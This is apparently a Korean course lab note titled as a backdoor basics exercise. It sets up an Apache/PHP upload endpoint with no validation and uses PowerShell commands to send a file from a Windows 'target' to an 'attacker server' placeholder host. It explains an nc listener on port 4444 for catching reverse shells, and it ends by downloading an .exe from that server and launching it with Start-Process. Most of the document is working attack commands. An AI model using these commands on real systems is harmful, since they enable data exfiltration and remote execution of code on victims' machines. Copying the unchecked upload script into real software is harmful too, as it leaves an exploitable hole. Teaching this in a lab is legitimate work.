# 2강 실습: 웹 서버를 이용한 파일 업로드 및 다운로드 (Backdoor 기초)

이 문서는 Apache2와 PHP를 활용하여 파일을 업로드하고 다운로드하는 실습 과정을 정리한 것입니다.

---

## 1. 환경 설정 및 패키지 설치

먼저 아파치 웹 서버와 PHP를 설치하고 활성화합니다.

```bash
# 패키지 리스트 업데이트 및 설치
sudo apt update
sudo apt install apache2 php libapache2-mod-php

# Apache2 시작 및 부팅 시 자동 시작 설정
sudo systemctl start apache2
sudo systemctl enable apache2
```

## 2. 업로드 디렉토리 생성 및 권한 설정

파일이 저장될 디렉토리를 생성하고, 웹 서버(`www-data`)가 파일을 쓸 수 있도록 권한을 부여합니다.

```bash
# 디렉토리 생성
sudo mkdir -p /var/www/html/uploads

# 소유권 변경 (아파치 사용자에게 부여)
sudo chown www-data:www-data /var/www/html/uploads

# 권한 설정 (읽기 및 실행 권한 부여)
sudo chmod 755 /var/www/html/uploads
```

## 3. 업로드 스크립트 작성 (`upload.php`)

파일 업로드를 처리하는 PHP 스크립트를 작성합니다.
/var/www/html/ 위치에 생성.

**파일명: `upload.php`**

```php
<?php
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

```bash
# Apache 재시작
sudo systemctl restart apache2
```

## 4. 실습: 파일 가져오기 (Target -> Server)

타겟(Windows)에서 공격자 서버(Linux)로 파일을 업로드하는 과정입니다.

1. **서버에서 nc -lvnp 4444 실행**
   Netcat(nc) 도구를 사용하여 특정 포트(4444)에서 통신을 기다리는(리스닝) 상태를 만드는 명령어입니다. 각
   옵션의 의미는 다음과 같습니다.
   - nc: Netcat 실행. '네트워크의 맥가이버 칼'이라 불리는 도구입니다.
   - -l (Listen): 연결을 기다리는 '리스닝' 모드로 동작합니다. (서버 역할)
   - -v (Verbose): 상세 정보 출력. 연결이 성공했는지 등을 화면에 보여줍니다.
   - -n (Numeric-only): DNS 확인을 하지 않고 IP 주소로만 통신합니다. (속도 향상 및 기록 최소화)
   - -p 4444 (Port): 연결을 기다릴 포트 번호를 4444로 지정합니다.

실습 문맥에서의 용도:
해킹 실습(Backdoor) 환경에서는 주로 리버스 쉘(Reverse Shell)을 받기 위해 사용합니다. 타겟 컴퓨터가 공격자의 4444
포트로 접속을 시도하면, 이 명령어를 실행 중인 공격자 터미널에서 타겟의 권한을 획득하게 됩니다.

2. **타겟 PC에서 nc.py 실행**

3. **타겟(Windows PowerShell)에서 업로드 명령 실행**

   ```powershell
   (New-Object System.Net.WebClient).UploadFile('http://[서버IP]/upload.php', 'C:\Users\[username]\test.txt')
   ```

4. **서버에서 업로드 확인 및 삭제**
   ```bash
   ls -l /var/www/html/uploads
   cat /var/www/html/uploads/test.txt
   sudo rm /var/www/html/uploads/test.txt
   ```

## 5. 실습: 파일 보내기 (Server -> Target)

공격자 서버에 있는 파일을 타겟(Windows)으로 다운로드하는 과정입니다.

1.  **서버에서 파일 준비**

    ```bash
    # /var/www/html/uploads/ 위치에 파일 생성
    sudo vim /var/www/html/uploads/test123.txt
    ```

2.  **권한 설정 (외부에서 접근 가능하도록)**

    ```bash
    sudo chown www-data:www-data /var/www/html/uploads/test123.txt
    sudo chmod 644 /var/www/html/uploads/test123.txt
    ```

3.  **타겟(Windows PowerShell)에서 다운로드 명령 실행**

    ```powershell
    Invoke-WebRequest -Uri 'http://[서버IP]/uploads/test123.txt' -OutFile 'C:\Users\[username]\test123.txt'
    ```

4.  **서버 정리**
    ```bash
    sudo rm /var/www/html/uploads/test123.txt
    ls /var/www/html/uploads/
    ```

## 6. exe 파일 보내고 실행시키기

공격자 서버에 있는 exe 파일을 타겟(Windows)로 보내 실행시킬 수 있다.

```powershell
Invoke-WebRequest -Uri 'http://[서버IP]/uploads/test.exe' -OutFile 'C:\Users\[username]\test.exe'

Start-Process -FilePath "C:\Users\[username]\test.exe"
```
